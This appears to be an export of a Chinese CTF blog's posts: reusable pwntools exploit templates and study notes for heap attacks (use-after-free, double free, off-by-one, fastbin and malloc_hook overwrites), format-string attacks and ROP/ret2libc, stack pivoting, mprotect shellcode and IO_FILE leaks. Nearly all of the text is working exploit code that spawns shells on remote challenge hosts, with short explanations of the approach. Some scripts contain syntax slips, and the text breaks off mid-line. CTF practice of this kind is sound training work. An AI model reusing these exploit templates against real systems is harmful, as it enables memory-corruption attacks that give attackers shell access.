p.sendlineafter('root@ubuntu:~/Desktop$', b'1')\n    p.sendlineafter('please input id and size :', str(id))\n    sleep(0.1)\n    p.sendline(b'100')\n    p.sendlineafter('please input contet:', contet)\n\ndef free(id):\n    p.sendlineafter('root@ubuntu:~/Desktop$', b'2')\n    p.sendlineafter('please input id :', str(id))\n\ndef print(id):\n    p.sendlineafter('root@ubuntu:~/Desktop$', b'3')\n    p.sendlineafter('please input id :', str(id))\n\n\nfulltcache()\n\nmalloc(1, b'qwer')\nmalloc(2, b'qwer')\nmalloc(3, b'qwer')\n\n\nfree(1)\nfree(2)\nfree(1)\n\n#attach(p)\nmalloc(4,p64(0x006010A0))#可修改的内容在这个地址后16字节\nmalloc(5,b'qwer')\nmalloc(6,b'qwer')\nmalloc(7,p64(257))\np.interactive()\n\n```\n\n# uaf\n\n```\nfrom pwn import *\n\ncontext(arch='i386', log_level='debug', os='linux')\nelf=ELF(\"./pwn\")\n\n\ndef malloc(size, contet):\n    p.sendlineafter(\"5. exit\", b'1')\n    p.sendlineafter(\"--->\", str(size))\n    p.sendafter(\"--->\", contet)\ndef free(id):\n    p.sendlineafter(\"5. exit\", b'3')\n    p.sendlineafter(\"--->\", str(id))\n\ndef edit(id,size,contet):\n    p.sendlineafter(\"5. exit\", b'2')\n    p.sendlineafter(\"--->\", str(id))\n    p.sendlineafter(\"--->\", str(size))\n    p.sendafter(\"--->\", contet)\n\ndef show(id):\n    p.sendlineafter(\"5. exit\", b'4')\n    p.sendlineafter(\"--->\", str(id))\n\n\n# p = process('./pwn')\np = remote('node4.buuoj.cn', 26517)\nlibc = ELF('libc-2.23.so')\nmalloc(0x80, b'qwer')\nmalloc(0x80, b'qwer')\nmalloc(0x68, b'qwer')\nmalloc(0x68, b'qwer')\nmalloc(0x68, b'/bin/sh')\n\nfree(0)\nshow(0)\np.recvuntil(\":\")\nlibc_base = u64(p.recv(7)[1:] + b'\\0' * 2) - 0x7fef613c4b78 + 0x7fef61000000\nsystem = libc_base + libc.sym[\"system\"]\nfree_got = elf.got['free']\n# pause()\nfree(2)\nfree(3)\nfree(2)\nmalloc(0x68, p64(0x0000000006020C0 - 0x23))\nmalloc(0x68, 'ase')\nmalloc(0x68, 'ase')\nprint(hex(libc_base))\nprint(hex(free_got))\nmalloc(0x68, b'a' * (0x23 - 0x10) + p64(free_got))\n# attach(p)\nedit(0, 10, p64(system))\np.sendlineafter(\"5. exit\", b'3')\np.sendlineafter(\"--->\", b'4')\np.interactive()\n```\n\n# 2.27uaf\n\n```\nfrom struct import pack\ncontext.log_level='debug'\ncontext(os = 'linux', arch = 'amd64')\n\n#p = process('./pwn')\np = remote('43.142.108.3', 28585)\nelf = ELF('./pwn')\n#libc = ELF('buu/libc-2.27-x64.so')\n#libc = ELF('glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')\nlibc = ELF('libc-2.27.so')\n\ndef debug():\n\tgdb.attach(p)\n\tpause()\ndef add(size, name, content):\n\tp.sendlineafter(b'Choice: \\n', '1')\n\tp.sendlineafter(b'Size:\\n', str(size))\n\tp.sendafter(b'Name: \\n', name)\n\tp.sendafter(b'Content:\\n', content)\ndef free(index):\n\tp.sendlineafter(b'Choice: \\n', '2')\n\tp.sendlineafter(b'idx:\\n', str(index))\ndef show(index):\n\tp.sendlineafter(b'Choice: \\n', '3')\n\tp.sendlineafter(b'idx:\\n', str(index))\ndef edit(index, content):\n\tp.sendlineafter(b'Choice: \\n', '4')\n\tp.sendlineafter(b'idx:\\n', str(index))\n\tp.send(content)\n# leak libcbase\nadd(0x410, b'1', b'a') #index 0\nadd(0x20, b'1', b'a') #index 1\nadd(0x10, b'1', b'a') #index 2\nfree(0)\nshow(0)\nlibcbase = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00')) - 96 - 0x10 - libc.sym['__malloc_hook']\nprint(' libcbase -> ', hex(libcbase))\n\n# malloc_hook -> one_gadget\none_gadget = libcbase + 0x10a2fc\nmalloc_hook = libcbase + libc.sym['__malloc_hook']\nfree(1)\nedit(1, p64(malloc_hook))\nadd(0x10, b'1', b'a') #index 3\nadd(0x20, b'1', b'a') #index 4\nedit(4, p64(one_gadget))\n\n# pwn\np.sendlineafter(b'Choice: \\n', '1')\np.sendlineafter(b'Size:\\n', b'10')\np.interactive()\n\n```\n\n# 堆溢出\n\n```\nfrom pwn import *\n\ndef connetc():\n    global p,elf,libc\n    p=remote('192.168.109.168',10000)\n    #p=process('./Emo_Chunk')\n    elf=ELF('./Emo_Chunk')\n    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\n#context.log_level='debug'\ndef add(size):\n p.sendlineafter(\"Please Choice!\",'1')\n p.sendlineafter(\"Please Input Size:\",str(size))\n\ndef dele(index):\n p.sendlineafter(\"Please Choice!\",'2')\n p.sendlineafter(\"Please Input index:\",str(index))\n\ndef show(index):\n p.sendlineafter(\"Please Choice!\",'4')\n p.sendlineafter(\"Please Input index:\",str(index))\ndef edit(index,content):\n p.sendlineafter(\"Please Choice!\",'3')\n p.sendlineafter(\"Please Input index:\",str(index))\n p.sendlineafter(\"Change EMo Content\",content)\ndef pwn(i,j):\n    add(0x68)#0\n    add(0x68)#1\n    add(0x68)#2\n    add(0x68)#3\n    add(0x68)#4\n    add(0x68)#5\n  \n    edit(0,'a'*0x68 + '\\xe1' + '\\x00'*7)\n  \n    dele(1)\n    add(0x68)\n    show(2)\n    p.recvuntil('\\n')\n\n    addr = u64(p.recv(6).ljust(8,'\\x00'))\n    print(\"addr : \" + hex(addr-0x3c4b78))\n  \n    libc_addr = addr - 0x3c4b78\n    dele(4)\n    edit(3,'a'*0x68 + p64(0x71) + p64(libc_addr+libc.symbols['__malloc_hook']-0x23))\n    print(hex(libc_addr+libc.symbols['__malloc_hook']-0x23))\n\n    realloc_hook = libc_addr + libc.sym['__realloc_hook']\n    log.info(\"realloc_hook:\"+hex(realloc_hook))\n    realloc = libc_addr + libc.sym['realloc']\n    log.info(\"realloc:\"+hex(realloc))\n  \n    add(0x68) #4\n\n    add(0x68) #6\n    one = [0x45226,0x4527a,0xf03a4,0xf1247]\n    edit(6,cyclic(11)+p64(libc_addr+one[i]) + p64(realloc + j))\n    add(0x30)\n\n    p.interactive()\nfor i in range(4):\n for j in [0,2,4,6,8,10,13,16,20]:\n     try:\n      print(\"i :\",i)\n      print(\"j :\",j)\n      connetc()\n      pwn(i,int(j))\n          p.close()\n     except :\n      print(\"...\")\n      p.close()\n\n```\n\n# off_by_one\n\n```\nfrom pwn import *\nfrom LibcSearcher import *\ncontext.log_level='debug'\ncontext.arch='amd64'\n\ndef add(size,contet):\n    p.sendafter(\"Your choice :\",b'1')\n    p.sendafter(\"Size of Heap :\",str(size))\n    p.sendafter(\"Content of heap:\",contet)\n\ndef edit(index,contet):\n    p.sendafter(\"Your choice :\",b'2')\n    p.sendafter(\"Index :\",str(index))\n    p.sendafter(\"Content of heap :\",contet)\n\ndef show(index):\n    p.sendafter(\"Your choice :\",b'3')\n    p.sendafter(\"Index :\", str(index))\n\ndef dele(index):\n    p.sendafter(\"Your choice :\",b'4')\n    p.sendlineafter(\"Index :\",str(index))\n\n# p= process(\"./heapcreator\")\np=remote(\"node4.buuoj.cn\",27274)\nadd(0x18,b'a')\nadd(0x10,b'b')\nadd(0x10,b'c')\nadd(0x10,b'/bin/sh')\nedit(0,b'a'*0x18+b'\\x81')\ndele(1)\nadd(0x70,b'a')\nedit(1,0x10*b'b'+p64(0)+p64(0x21)+p64(0x40)+p64(0x000000000602018))\n# attach(p)\nshow(1)\nfree=p.recvuntil(\"\\x7f\")[-6:]+b'\\0'*2\nfree = u64(free)\nprint(hex(free))\nlibc=LibcSearcher(\"free\",free)\nsystem=libc.dump(\"system\")\nprint(libc)\n#attach(p)\nedit(1,p64(system+free-libc.dump(\"free\")))\ndele(3)\np.interactive()\n```\n\n","categories":["模板"],"tags":["heap"]},{"title":"堆学习（初级）","url":"/2023/11/02/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%A0%86%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%88%9D%E7%BA%A7%EF%BC%89/","content":"\n# 堆溢出\n\n## babyheap_0ctf_2017\n\n典型堆溢出，但使用了calloc（在malloc后会清空申请的空间），对泄露libc造成了一些麻烦\n\n解法不少，目前学了一种\n\n### 思路\n\n```\n堆地址未知\nadd0，1，2，3（只有3要求大一些，放到unsorted）\n0作用：修改1和2\nfree1\nfree2\n会放到fastbin，2->1\n0溢出，穿过1，修改2的fd指针，改到3的身上\nfastibn：2->3(1丢失)\nadd 1(申请到2)\n\n按理来说再add 2就可以申请到3，双重身份，但是3的大小不符合fast，必然申请不出来所以\nfill 1 （用2溢出到3，修改3的大小到0x10，满足fast）\nadd 2(申请到了3)\nadd 4(0x80，防止合并到top)\nfill 1 （再改回去，保证等等放到unsorted）\nfree 3 （放到第一个unsorted，fd和bd都会变成libc_areas+xx）\ndump 2 查看3里面的fd\n泄露libc完成，后面的就是常规堆溢出\n```\n\n### exp\n\n```\nfrom pwn import *\ncontext.log_level = \"debug\"\ncontext.arch=\"amd64\"\n\none=[0x45216,0x4526a]\n\ndef add(size):\n    p.sendlineafter(\"Command:\",\"1\")\n    p.sendlineafter(\"Size:\",str(size))\n\ndef fill(index,context):\n    p.sendlineafter(\"Command:\",\"2\")\n    p.sendlineafter(\"Index:\",str(index))\n    p.sendlineafter(\"Size:\", str(len(context)))\n    p.sendlineafter(\"Content:\", context)\ndef free(index):\n    p.sendlineafter(\"Command:\",\"3\")\n    p.sendlineafter(\"Index:\", str(index))\n\ndef dump(index):\n    p.sendlineafter(\"Command:\",\"4\")\n    p.sendlineafter(\"Index:\", str(index))\ndef pwn(i):\n\n    try:\n        add(0x10)  # 0\n        add(0x10)  # 1\n        add(0x10)  # 2\n        add(0x80)  # 3\n\n        free(1)  # 释放1\n        free(2)  # 释放2\n        fill(0, b\"a\" * 0x10 + p64(0) + p64(0x21) + b\"a\" * 0x10 + p64(0) + p64(0x21) + p8(0x60))  # 使2指向3\n        add(0x10)  # 申请回来2编号为1\n        fill(1, b\"a\" * 0x10 + p64(0) + p64(0x21))\n        add(0x10)  # 申请到3编号为2\n        add(0x80)  # 防止合并，编号为5\n        fill(1, b\"a\" * 0x10 + p64(0) + p64(0x91))\n        free(3)  # 把3放到uns\n        # attach(p)\n        dump(2)  # dump(2)#查看3中的libc\n        libc = u64(p.recvuntil(\"\\x7f\")[-6:] + b\"\\0\" * 2)\n        malloc_hook = libc - 0x68\n        libc_base = libc + 0x7f7a5ee00000 - 0x7f7a5f1c4b78\n        one_gadget=one[1]+libc_base\n        print(hex(libc))\n        success(hex(malloc_hook))\n        add(0x80)  # 取出3，放到3，把exp两部分分开\n        add(0x60)  # 6\n        add(0x60)  # 7\n        add(0x60)  # 8,防合并\n        free(7)\n        fill(6, b\"a\" * 0x60 + p64(0) + p64(0x71) + p64(malloc_hook - 0x10 - i))\n        add(0x60)  # 7\n        add(0x60)  # 8,mallochook\n        fill(8, b\"aaa\"+p64(one_gadget))\n        add(0x10)\n        p.interactive()\n    except:\n        pass\n\n\np = remote(\"node4.buuoj.cn\",27576)\npwn(3)\n```\n\n第二天看其他人的wp，发现不需要另起炉灶，下面是简易的exp\n\n### exp2\n\n```\nfrom pwn import *\ncontext.log_level = \"debug\"\ncontext.arch=\"amd64\"\n\none=[0x45216,0x4526a]\n\ndef add(size):\n    p.sendlineafter(\"Command:\",\"1\")\n    p.sendlineafter(\"Size:\",str(size))\n\ndef fill(index,context):\n    p.sendlineafter(\"Command:\",\"2\")\n    p.sendlineafter(\"Index:\",str(index))\n    p.sendlineafter(\"Size:\", str(len(context)))\n    p.sendlineafter(\"Content:\", context)\ndef free(index):\n    p.sendlineafter(\"Command:\",\"3\")\n    p.sendlineafter(\"Index:\", str(index))\n\ndef dump(index):\n    p.sendlineafter(\"Command:\",\"4\")\n    p.sendlineafter(\"Index:\", str(index))\n\n\np = process(\"./heap\")\n\nadd(0x10)  # 0\nadd(0x10)  # 1\nadd(0x10)  # 2\nadd(0x80)  # 3\n\nfree(1)  # 释放1\nfree(2)  # 释放2\nfill(0, b\"a\" * 0x10 + p64(0) + p64(0x21) + b\"a\" * 0x10 + p64(0) + p64(0x21) + p8(0x60))  # 使2指向3\nadd(0x10)  # 申请回来2编号为1\nfill(1, b\"a\" * 0x10 + p64(0) + p64(0x21))\nadd(0x10)  # 申请到3编号为2\nadd(0x80)  # 防止合并，编号为4\nfill(1, b\"a\" * 0x10 + p64(0) + p64(0x91))\nfree(3)  # 把3放到uns\n# attach(p)\ndump(2)  # dump(2)#查看3中的libc\nlibc = u64(p.recvuntil(\"\\x7f\")[-6:] + b\"\\0\" * 2)\nmalloc_hook = libc - 0x68\nlibc_base = libc + 0x7f7a5ee00000 - 0x7f7a5f1c4b78\none_gadget = one[1] + libc_base\nprint(hex(libc))\nsuccess(hex(malloc_hook))\nadd(0x60)  # 取出一部分3,编号为3\nfree(3)\nfill(1,b\"a\" * 0x10 + p64(0) + p64(0x71)+p64(malloc_hook-0x23))\n\nadd(0x60)\nadd(0x60)\n#attach(p)\nfill(5,b'a'*0x13+p64(one_gadget))\nadd(10)\np.interactive()\n```\n\n## [ZJCTF 2019]EasyHeap\n\n### 思路\n\n本题也是直接给了栈溢出，不过没有show函数，没法泄露libc\n\n直接给了system函数，但是我一开始不会用，于是有了一个离奇的办法，伪造一个chunk到got表，free函数在got表的第一个，我把one_gadget塞里面去，需要爆破，概率是1/16\n\n```\nfrom pwn import *\n\ncontext.log_level = \"debug\"\ncontext.arch = \"amd64\"\n\none = [0x45216, 0x4526a,0xf1147,0xf02a4]\n\n\ndef add(size, context):\n    p.sendafter(\"Your choice :\", \"1\")\n    p.sendafter(\"Size of Heap :\", str(size))\n    p.sendafter(\"Content of heap:\", context)\n\n\ndef fill(index, context):\n    p.sendafter(\"Your choice :\", \"2\")\n    p.sendafter(\"Index :\", str(index))\n    p.sendafter(\"Size of Heap :\", str(size(context)))\n    p.sendafter(\"Content of heap :\", context)\n\n\ndef free(index):\n    p.sendafter(\"Your choice :\", \"3\")\n    p.sendafter(\"Index :\", str(index))\n\n\n# def dump(index):\n#     p.sendafter(\"Your choice :\",\"4\")\n#     p.sendafter(\"Index:\", str(index))\n\nfor i in range(100):\n    try:\n        #p = process(\"./easyheap\")\n        p=remote(\"node4.buuoj.cn\",25384)\n\n        add(0x10, b'a')  # 0\n        add(0x50, b'a')  # 1\n        add(0x10, b'a')  # 2,fang he bing\n        free(1)\n        fill(0, b'a' * 0x10 + p64(0) + p64(0x61) + p64(0x601ffa))\n\n        add(0x50, b'a')  # 3\n\n        add(0x50, b'a' * (0x602018 - 0x601ffa - 0x10) + p8(0xa4) + p8(0x02) + p8(0xef))  # 4,magic 0x45216 0xf02a4\n        #attach(p)\n        free(0)\n        p.sendline(\"cat flag\")\n        p.interactive()\n    except:\n        pass\n       \n```\n\n看了看佬的exp，稍微改了一下我的\n\n### 改进版（有问题）\n\n```\nfrom pwn import *\n\ncontext.log_level = \"debug\"\ncontext.arch = \"amd64\"\n\none = [0x45216, 0x4526a,0xf1147,0xf02a4]\n\n\ndef add(size, context):\n    p.sendafter(\"Your choice :\", \"1\")\n    p.sendafter(\"Size of Heap :\", str(size))\n    p.sendafter(\"Content of heap:\", context)\n\n\ndef fill(index, context):\n    p.sendafter(\"Your choice :\", \"2\")\n    p.sendafter(\"Index :\", str(index))\n    p.sendafter(\"Size of Heap :\", str(size(context)))\n    p.sendafter(\"Content of heap :\", context)\n\n\ndef free(index):\n    p.sendafter(\"Your choice :\", \"3\")\n    p.sendafter(\"Index :\", str(index))\n\n\n# def dump(index):\n#     p.sendafter(\"Your choice :\",\"4\")\n#     p.sendafter(\"Index:\", str(index))\n\n\np = process(\"./easyheap\")\n#p = remote(\"node4.buuoj.cn\", 25384)\n\nadd(0x10, b'/bin/sh')  # 0\nadd(0x50, b'a')  # 1\nadd(0x10, b'/bin/sh\\0')  # 2,fang he bing\nfree(1)\nfill(0, b'a' * 0x10 + p64(0) + p64(0x61) + p64(0x601ffa))\n\nadd(0x50, b'a')  # 3\n\nadd(0x50, b'a' * (0x602018 - 0x601ffa - 0x10) + p64(0x400700))  # 4,magic 0x45216 0xf02a4\nattach(p)\nfree(2)\np.interactive()\n\n```\n\n问题很简单，system函数未被调用，所以got还需初始化，而我们修改free的时候把基地址破坏掉了\n\n如果想要打通，可以先跑一次system，懒得搞了\n\n### 最终版\n\n在bss段里的，自创的chuck表上方下方创建chunk，修改chunk0的地址，改到free函数的got表，修改got表，改为system，再free一个写有/bin/sh的chunk，就变成了system（“/bin/sh”）\n\n```\nfrom pwn import *\n\ncontext.log_level = \"debug\"\ncontext.arch = \"amd64\"\n\none = [0x45216, 0x4526a,0xf1147,0xf02a4]\n\n\ndef add(size, context):\n    p.sendafter(\"Your choice :\", \"1\")\n    p.sendafter(\"Size of Heap :\", str(size))\n    p.sendafter(\"Content of heap:\", context)\n\n\ndef fill(index, context):\n    p.sendafter(\"Your choice :\", \"2\")\n    p.sendafter(\"Index :\", str(index))\n    p.sendafter(\"Size of Heap :\", str(size(context)))\n    p.sendafter(\"Content of heap :\", context)\n\n\ndef free(index):\n    p.sendafter(\"Your choice :\", \"3\")\n    p.sendafter(\"Index :\", str(index))\n\n\n# def dump(index):\n#     p.sendafter(\"Your choice :\",\"4\")\n#     p.sendafter(\"Index:\", str(index))\n\n\np = process(\"./easyheap\")\np = remote(\"node4.buuoj.cn\", 28047)\n\n\nadd(0x10, b'a')  # 0\nadd(0x60, b'a')  # 1\nadd(0x10, b'/bin/sh\\0')  # 2,fang he bing\nfree(1)\nfill(0, b'a' * 0x10 + p64(0) + p64(0x71) + p64(0x6020ad))\nadd(0x60, b'a')  # 1\nadd(0x60, b'a' * 0x23 + p64(0x602018))  # 3,magic 0x45216 0xf02a4\nfill(0,p64(0x00400700))\n#attach(p)\nfree(2)\np.interactive()\n```\n\n## UAF\n\n### 练手小题\n\n有一个chunk存输出函数，申请一个等大的堆，倒腾了两下，跳后门去了\n\n```\np = remote(\"node4.buuoj.cn\", 25065)\n\nmagic=0x8048945\nadd(0x8,b'a')\nadd(0x20,b'a')\nadd(0x8,b'a')\nfree(0)\nfree(1)\n\nadd(0x8,p32(magic))\n#attach(p)\np.interactive()\n```\n","categories":["笔记"],"tags":["堆"]},{"title":"fmt模板","url":"/2023/09/26/%E6%A8%A1%E6%9D%BF/fmt%E6%A8%A1%E6%9D%BF/","content":"\n# 常见非预期解\n\n```\nfor i in range(1, 100):\n    try:\n        # r=process('./pwn')\n        r = remote('node4.buuoj.cn', 26477)\n        elf = ELF('./pwn')\n        r.sendlineafter(\"Give me your name:\", 's')\n        for j in range(3):\n            r.recvuntil(\"food: \")\n            r.sendline('%' + str(10 + 3 * i + j) + '$s.')\n            print(i, r.recvuntil(b'.', drop=True))\n    except EOFError:\n        pass\n```\n\n# fmt不在栈上\n\n```\nfrom pwn import *\ncontext(os='linux',arch='amd64')  #need tmux\ncontext.log_level=\"debug\"\n\n# p = remote(\"node4.buuoj.cn\", 26443)\np = process(\"./pwn\")\np.sendlineafter(\"Give me your name:\", b\"/bin/sh\")\n\np.sendlineafter(\"food:\", b'%9$p^%11$p^')\nlibc_base = int(p.recvuntil(\"^\")[10:-1], 16) - 0x20750 - 240  # __libc_start_main\nstack = int(p.recvuntil(\"^\")[:-1], 16)\ni_addr = stack - 0x7ffc0bd8af08 + 0x7ffc0bd8ae40\none = libc_base + 0x45226\nprint(hex(one))\np.sendlineafter(\"food:\", \"%{}p%11$hn\".format((i_addr - 0x30 + 4) & 0xffff))\n# attach(p)\np.sendlineafter(\"food:\", \"%{}p%37$hhn\".format(1))\n\np.sendlineafter(\"food:\", \"%{}p%11$hn\".format((i_addr - 0x18) & 0xffff))\n# attach(p)\np.sendlineafter(\"food:\", \"%{}p%37$hn\".format(one & 0xffff))\n\np.sendlineafter(\"food:\", \"%{}p%11$hn\".format((i_addr - 0x18 + 2) & 0xffff))\n# attach(p)\np.sendlineafter(\"food:\", \"%{}p%37$hhn\".format((one & 0xff0000) // 0x10000))\nfor i in range(8):\n    p.sendlineafter(\"food:\", \"1\")\n# attach(p)\np.sendlineafter(\"food:\", \"1\")\nprint(hex(libc_base))\np.interactive()\n```\n\n","categories":["模板"],"tags":["shellcode"]},{"title":"rop模板","url":"/2023/09/26/%E6%A8%A1%E6%9D%BF/rop%E6%A8%A1%E6%9D%BF/","content":"\n\n\n```\n不用libcsearcher的时候用\n\nnext(libc.search(b'/bin/sh'))\n\n用的时候用\n\nlibc.dump('str_bin_sh')\n```\n\n\n\n# 32位printf\n\n```\nfrom pwn import *\nfrom LibcSearcher import *\ncontext.log_level=\"debug\"\np = remote('node4.buuoj.cn',28619)\nelf=ELF(\"pwn2_sctf_2016\")\nlibc=ELF(\"libc-2.23.so\")\np.sendlineafter(\"read?\",b'-1')\n\nesi_edi_ebp=0x0804864d\natoi_got=elf.got[\"atoi\"]\nprintf_plt=elf.plt[\"printf\"]\n\nformat_str=0x080486F8\nmain_addr=elf.sym[\"main\"]\n\npayload=(0x2c+4)*b'a'+p32(printf_plt) +p32(main_addr)  +p32(format_str) +p32(atoi_got)\np.sendlineafter(\"data!\",payload)\natoi_addr=u32(p.recvuntil(\"\\xf7\")[-4:])\nprint(hex(atoi_addr))\n\nlibc_base=atoi_addr-libc.sym[\"atoi\"]\nsystem_addr=libc_base+libc.sym[\"system\"]\nbin_sh=libc_base+next(libc.search(b'/bin/sh'))\nret=0x08048346\np.sendlineafter(\"read?\",b'-1')\npayload_=(0x2c+4)*b'a'+p32(ret)+p32(system_addr)+p32(main_addr)+p32(bin_sh)\np.sendlineafter(\"data!\",payload_)\np.interactive()\n```\n\n# 64位printf\n\n```\nfrom pwn import *\nfrom LibcSearcher import *\ncontext.log_level=\"debug\"\np = remote('node4.buuoj.cn',29207)\nelf=ELF(\"babyrop2\")\nlibc=ELF(\"libc.so.6\")\nrdi=0x0000000000400733\nrsi_r15_ret=0x0000000000400731\nprintf_plt=elf.plt[\"printf\"]\nread_got=elf.got[\"read\"]\nformat_str=0x0000000000400770\nmain_addr= elf.sym[\"main\"]\npayload(0x20+8)*b'a'+p64(rdi)+p64(format_str)+p64(rsi_r15_ret)+p64(read_got)+p64(0)+p64(printf_plt)+p64(main_addr)\np.sendlineafter(\"What's your name?\",payload)\nread_addr = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00'))\nlibc_base=read_addr-libc.sym[\"read\"]\nsystem_addr=libc_base+libc.sym[\"system\"]\nbin_sh_addr=libc_base+next(libc.search(b'/bin/sh'))\npayload_=(0x20+8)*b'a'+p64(rdi)+p64(bin_sh_addr)+p64(system_addr)\np.sendlineafter(\"What's your name?\",payload_)\np.interactive()\n\n\n\n```\n\n# 32位puts\n\n```\nfrom pwn import *\nfrom LibcSearcher import *\ncontext(arch='i386', log_level='debug', os='linux')\nelf=ELF('Game')\nlibc=ELF('libc-2.23.so')\nelf=ELF('Game')\n#p = process('Game')\n\nstar=0x080485F4\n\np= remote(\"123.60.135.228\",2136)\nputs_plt=elf.plt[\"puts\"]\nputs_got=elf.got[\"puts\"]\n\n\np.sendlineafter(\"Do you play game?\",b'yes')\np.sendlineafter(\"Do you think playing games will affect your learning?\",b'yes')\n\npayload=(0x6c+4)*b'a'+p32(puts_plt)+p32(star)+p32(puts_got)\np.sendlineafter(\"I think the same as you!\",payload)\n\np.recvline()\nputs_addr= u32(p.recvuntil(\"\\xf7\")[-4:])\nprint(hex(puts_addr))\nlibc=LibcSearcher('puts',puts_addr)\n\nret=0x080483ea\n\nlibc_base = puts_addr - libc.dump('puts')\nsystem_addr = libc_base + libc.dump('system')\nbinsh_addr = libc_base + libc.dump('str_bin_sh')\npayload=(0x6c+4)*b'a'+p32(ret)+p32(system_addr)+p32(star)+p32(binsh_addr)\n\np.sendlineafter(\"I think the same as you!\",payload)\n\np.interactive()\n```\n\n# 64位puts\n\n```\nfrom pwn import *\nfrom LibcSearcher import *\ncontext.log_level=\"debug\"\np = remote('node4.buuoj.cn',28552)\nelf=ELF(\"bjdctf_2020_babyrop\")\nmain_addr = elf.sym['main']\nputs_plt = elf.plt['puts']\nputs_got = elf.got['puts']\npop_rdi_ret=0x0000000000400733\n\n\npayload =b'a' * 40 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)\np.sendlineafter(\"Pull up your sword and tell me u story!\",payload)\nputs_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nprint(hex(puts_addr))\n\nlibc = LibcSearcher('puts', puts_addr)\nlibc_base = puts_addr - libc.dump('puts')\nsystem_addr = libc_base + libc.dump('system')\nbinsh_addr = libc_base + libc.dump('str_bin_sh')\nret_addr=0x00000000004004c9\n\npayload2 = b'a' * 40 +p64(ret_addr)+p64(pop_rdi_ret) + p64(binsh_addr)+p64(system_addr)\np.sendlineafter(\"Pull up your sword and tell me u story!\",payload2)\np.interactive()\n```\n\n# 64位write\n\n```\nfrom pwn import *\nfrom LibcSearcher import *\ncontext.log_level=\"debug\"\np = remote('node4.buuoj.cn',26446)\nelf=ELF(\"level3_x64\")\nmain_addr = elf.sym['main']\nwrite_plt = elf.plt['write']\nwrite_got = elf.got['write']\npop_rdi_ret=0x00000000004006b3\npop_rsi_r15_ret=0x00000000004006b1\n\npayload =b'a' * (0x80+8) + p64(pop_rdi_ret) +p64(1)+p64(pop_rsi_r15_ret)+p64(write_got)+p64(0) +p64(write_plt)+ p64(main_addr)\np.sendlineafter(\":\",payload)\n\nwrite_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nprint(hex(write_addr))\n\nlibc = ELF(\"libc-2.23.so\")\nlibc_base = write_addr - libc.sym['write']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.dump('str_bin_sh')\nret_addr=0x00000000004004c9\n\npayload2 =b'a' * (0x80+8)  +p64(pop_rdi_ret) + p64(binsh_addr)+p64(system_addr)\np.sendlineafter(\":\",payload2)\np.interactive()\n```\n\n# libc不匹配别害怕，这样搞\n\n```\nfrom pwn import *\nfrom LibcSearcher import *\np = remote(\"123.60.135.228\",2082)\n#p= process('./sleep')\ncontext.log_level=\"debug\"\nelf=ELF(\"sleep\")\nmain_addr = 0x0000000004006BD\nputs_plt = elf.plt['puts']\nputs_got = elf.got['puts']\ngets_plt = 0x000000000400550\npop_rdi_ret=0x0000000000400783\n\npayload =b'a' * (0x70+8) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt)+p64(main_addr)\n#attach(p)\np.sendlineafter(\"Please cherish every second of sleeping time !!!\",payload)\n#p.interactive()\nputs_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nprint(hex(puts_addr))\n\nlibc = LibcSearcher('puts', puts_addr)\nlibc_base = puts_addr - libc.dump('puts')\nsystem_addr = libc_base + libc.dump('system')\nbinsh_addr = 0x0000000000601040\nret_addr = 0x0000000000400501\n#attach(p)\npayload2 = b'a' * (0x70+8) +p64(ret_addr)+p64(pop_rdi_ret) + p64(0x000000000601040)+p64(gets_plt)+p64(ret_addr)+p64(main_addr)\n\np.sendlineafter(\"Please cherish every second of sleeping time !!!\",payload2)\nsleep(2)\np.sendline(b'/bin/sh\\0')\n\npayload2 = b'a' * (0x70+8) +p64(ret_addr)+p64(pop_rdi_ret) + p64(binsh_addr)+p64(system_addr)\np.sendlineafter(\"Please cherish every second of sleeping time !!!\",payload2)\np.interactive()\n```\n\n# 栈迁移\n\n```\nfrom pwn import *\nfrom LibcSearcher import *\n\ncontext(arch='amd64', log_level='debug', os='linux')\np=remote('123.60.135.228',2095)\n\nsys_addr=0X08048420\nleave_ret=0x080484d8\n#p=process(\"./pwn3\")\npayload=b'a'*40\n#attach(p)\np.sendafter(\"Please input your name:\",payload)\nebp= u32(p.recvuntil(\"\\xff\")[-4:])-16\nprint(hex(ebp))\n\npayload2=b'aaaa'+p32(sys_addr)+4*b'a'+p32(ebp-24)+b'/bin/sh'+b'\\0'+16*b'a'+p32(ebp-40)+p32(leave_ret)\n#                4            8     12             16           23   24       40            44\n#        40     36            32    28             24          17    16        0\n#attach(p)\np.sendafter(\"Would you like tell me some message:\",payload2)\np.interactive()\n```\n\n# 利用mprotect\n\n```python\nfrom pwn import * \n\n q = remote('node3.buuoj.cn',29645) \n\n \\#q = process('./get_started_3dsctf_2016') \n\n context.log_level = 'debug' \n\n mprotect = 0x0806EC80 \n\n buf = 0x80ea000 \n\n pop_3_ret = 0x0804f460 \n read_addr = 0x0806E140 \n payload = 'a'*56 \n payload += p32(mprotect) \n payload += p32(pop_3_ret) \n payload += p32(buf) \n payload += p32(0x1000) \n payload += p32(0x7) \n payload += p32(read_addr) \n payload += p32(buf) \n payload += p32(0) \n payload += p32(buf) \n payload += p32(0x100) \n q.sendline(payload) \n sleep(0.1) \n\n\n shellcode = asm(shellcraft.sh(),arch='i386',os='linux') \n q.sendline(shellcode) \n sleep(0.1) \n q.interactive() \n\n   \n```\n\n# IOFILE\n\n```\n# coding=utf-8\nfrom pwn import *\nfrom LibcSearcher import *  \nfrom ctypes import *\n\n# context.log_level = \"debug\"\ncontext.arch = \"amd64\"\np = remote('10.52.13.156', 53493)\n# p = process('./feedback')\n\np.sendlineafter(\"Which list do you want to write?\",b\"-8\")\npayload = p64(0xFBAD1800) + p64(0)*3 + b'\\x00'\np.sendlineafter(\".\\n\",payload)\n\np.recvuntil(b'\\x00'*8)\nlibc_base = u64(p.recv(8)) - 0x1ec980\nsuccess(hex(libc_base))\nflag = libc_base + 